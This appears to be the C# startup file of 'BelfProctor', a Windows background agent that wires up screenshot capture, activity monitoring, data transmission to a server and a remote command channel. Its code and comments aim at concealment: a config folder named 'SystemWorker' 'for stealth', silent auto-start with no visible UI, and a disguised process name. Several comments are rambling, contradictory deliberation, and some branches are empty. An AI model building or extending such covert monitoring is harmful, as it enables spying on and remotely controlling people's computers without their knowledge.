using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using BelfProctor.Services;
using BelfProctor.Models;
using System.Windows.Forms;
using Microsoft.Extensions.Options;

namespace BelfProctor;

public class Program
{
    public static async Task Main(string[] args)
    {
        // Mutex to prevent multiple instances
        using var mutex = new Mutex(false, "Global\\BelfProctorSystemWorker", out bool createdNew);
        if (!createdNew)
        {
            // If already running:
            // 1. If --config-ui is passed, we might want to signal the existing instance to show UI (complex) 
            //    OR just show a message saying it's running.
            // 2. If --auto-start, just exit silently.
            // 3. If normal launch, tell user it's running.
            
            if (args.Contains("--auto-start")) return;

            if (args.Contains("--config-ui"))
            {
                MessageBox.Show("Another instance is running. Please close it via Task Manager before changing settings.", "Already Running");
                return;
            }

            // Normal launch by user -> ask if they want to open settings?
            // Since we can't easily signal the other process in this simple app, we'll just warn.
            var res = MessageBox.Show("The monitoring agent is already running in the background.\n\nDo you want to configure settings? (This requires restarting the agent)", "Already Running", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (res == DialogResult.Yes)
            {
                // We can't kill the other process easily without Admin, but we can try or just show settings and hope for the best (file lock issues might occur).
                // Better approach: Just show settings. If they save, the file updates. The running agent might need restart to pick it up.
                // We will proceed to show settings below if we force it.
                // But wait, the Mutex block will exit scope if we continue? No, "using var" keeps it until Main exits.
                // Actually, if we want to run SettingsForm, we are a second process. 
                // We can show the form.
            }
            else
            {
                return;
            }
        }

        // Fix for running from Registry/Startup where CWD might be System32
        Directory.SetCurrentDirectory(AppDomain.CurrentDomain.BaseDirectory);

        var builder = Host.CreateApplicationBuilder(args);

        var environment = builder.Environment.EnvironmentName;
        
        // Ensure AppData directory exists for persistent config (Using "SystemWorker" folder for stealth)
        var localAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SystemWorker");
        Directory.CreateDirectory(localAppData);
        var appDataConfig = Path.Combine(localAppData, "appsettings.json");

        var possibleConfigs = new List<string>
        {
            Path.Combine(builder.Environment.ContentRootPath, "client", "appsettings.json"),
            Path.Combine(builder.Environment.ContentRootPath, "client", $"appsettings.{environment}.json"),
            Path.Combine(builder.Environment.ContentRootPath, "appsettings.json"),
            Path.Combine(builder.Environment.ContentRootPath, $"appsettings.{environment}.json"),
            appDataConfig
        };

        foreach (var cfg in possibleConfigs)
        {
            if (File.Exists(cfg))
            {
                builder.Configuration.AddJsonFile(cfg, optional: true, reloadOnChange: true);
            }
        }
        
        // Also add AppData config explicitly as optional even if not exists yet (so it's watched if created)
        builder.Configuration.AddJsonFile(appDataConfig, optional: true, reloadOnChange: true);
        
        // Настройка для работы как служба Windows
        builder.Services.AddWindowsService(options =>
        {
            options.ServiceName = "BelfProctor";
        });

        // Регистрация сервисов
        builder.Services.Configure<ProctorSettings>(
            builder.Configuration.GetSection("ProctorSettings"));
        
        var tempConfig = builder.Configuration.GetSection("ProctorSettings").Get<ProctorSettings>() ?? new ProctorSettings();
        
        // Check if not configured or forced UI
        // If --auto-start is present, we NEVER show UI unless config is totally broken (even then, maybe log and exit?)
        // If --auto-start and config missing -> show UI? No, that would be visible on boot. Better to fail silent or show error.
        // User wants "hidden". So if auto-start and no config -> Do nothing or Log.
        // But for now, let's assume if no config, we MUST show UI because it's useless otherwise.
        
        bool isAutoStart = args.Contains("--auto-start");
        bool needsConfig = string.IsNullOrWhiteSpace(tempConfig.ClientId) || 
                           string.IsNullOrWhiteSpace(tempConfig.ServerUrl) || 
                           args.Contains("--config-ui");

        // Force config loading from AppData if running from install dir (to ensure we don't miss it)
        var currentPath = Environment.ProcessPath;
        bool isInstalled = currentPath != null && currentPath.IndexOf("SystemWorker", StringComparison.OrdinalIgnoreCase) >= 0;

        // If auto-started, we want to run silently.
        // But if config is invalid, we can't run.
        if (isAutoStart)
        {
             if (needsConfig)
             {
                 // Check if we can find config in AppData manually before giving up
                 // (Already loaded above, but let's be sure)
                 if (isInstalled)
                 {
                     // If installed and still no config, maybe it was deleted?
                     // Do nothing to avoid popup.
                     return;
                 }
                 else
                 {
                     // If auto-start flag is present but we are NOT in installed location,
                     // it might be a manual run with flag? Or shortcut pointing to wrong place.
                     // Still, no UI.
                     return;
                 }
             }
        }
        else
        {
             // Manual start (no --auto-start)
             // Always show UI if config is missing OR if explicitly requested
             // OR if we want to force "Install" check
             
             // If manual start and config exists, we usually run worker.
             // But user might want to edit settings.
             // We'll show UI only if requested or missing config.
             
             // BUT, we want to ensure it is installed properly on first manual run.
             if (!isInstalled && !needsConfig)
             {
                  // It's configured but running from random location (e.g. Downloads).
                  // We should probably just run, but user asked for "Register 1 time".
                  // The UI does the registration/install.
                  // So maybe we should just run silently?
                  // User said "Start automatically".
             }
        }

        if (needsConfig)
        {
            // If auto-start and no config, we shouldn't block boot with a window, but we have no choice if we want it to work.
            // However, usually the installer/first run sets it up.
            // If user deleted config, it will pop up. Acceptable.
            
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            var cfg = builder.Configuration;
            var services = new ServiceCollection();
            services.Configure<ProctorSettings>(cfg.GetSection("ProctorSettings"));
            using var sp = services.BuildServiceProvider();
            var opts = sp.GetRequiredService<IOptions<ProctorSettings>>();
            
            // Prioritize saving to AppData for persistence
            var savePaths = new[] { appDataConfig }.Concat(possibleConfigs).ToArray();
            
            // Run settings form. If it returns, we assume settings might be saved.
            Application.Run(new UI.SettingsForm(cfg, opts.Value, savePaths));
            
            // Reload config after form close to see if we can proceed
            var newBuilder = Host.CreateApplicationBuilder(args);
            foreach (var c in possibleConfigs) if (File.Exists(c)) newBuilder.Configuration.AddJsonFile(c, true, true);
            // Also add AppData config
            newBuilder.Configuration.AddJsonFile(appDataConfig, optional: true, reloadOnChange: true);
            
            var newSettings = newBuilder.Configuration.GetSection("ProctorSettings").Get<ProctorSettings>();
            
            if (newSettings == null || string.IsNullOrWhiteSpace(newSettings.ClientId) || string.IsNullOrWhiteSpace(newSettings.ServerUrl))
            {
                // Still invalid? User cancelled or didn't save. Exit.
                return; 
            }
            
            // Check again for reload
            ((IConfigurationRoot)builder.Configuration).Reload();
        }

        // Ensure persistence on every run (in case registry was cleaned)
            if (!isAutoStart && !needsConfig)
            {
                 // We are running manually, fully configured.
                 // Ensure we are installed and auto-start is set.
                 // We can't easily access SettingsForm logic without showing UI, 
                 // but we can at least ensure we are running from the right place?
                 // For now, let's just let it run. The initial UI setup handles install.
            }

            builder.Services.AddSingleton<IScreenshotService, ScreenshotService>();
        builder.Services.AddSingleton<ISystemMonitorService, SystemMonitorService>();
        builder.Services.AddSingleton<IActivityMonitorService, ActivityMonitorService>();
        builder.Services.AddSingleton<IDataTransmissionService, DataTransmissionService>();
        builder.Services.AddSingleton<IPolicyService, PolicyService>();
        builder.Services.AddSingleton<IReportingService, ReportingService>();
        builder.Services.AddSingleton<IStabilityService, StabilityService>();
        builder.Services.AddSingleton<CommandHandler>();
        
        builder.Services.AddHostedService<ProctorWorker>();
        builder.Services.AddHostedService<CommandChannelWorker>();

        // Настройка логирования
        builder.Services.AddLogging(logging =>
        {
            logging.AddConsole();
            logging.AddEventLog();
        });

        // Removed redundant --config-ui block

        var host = builder.Build();
        await host.RunAsync();
    }
}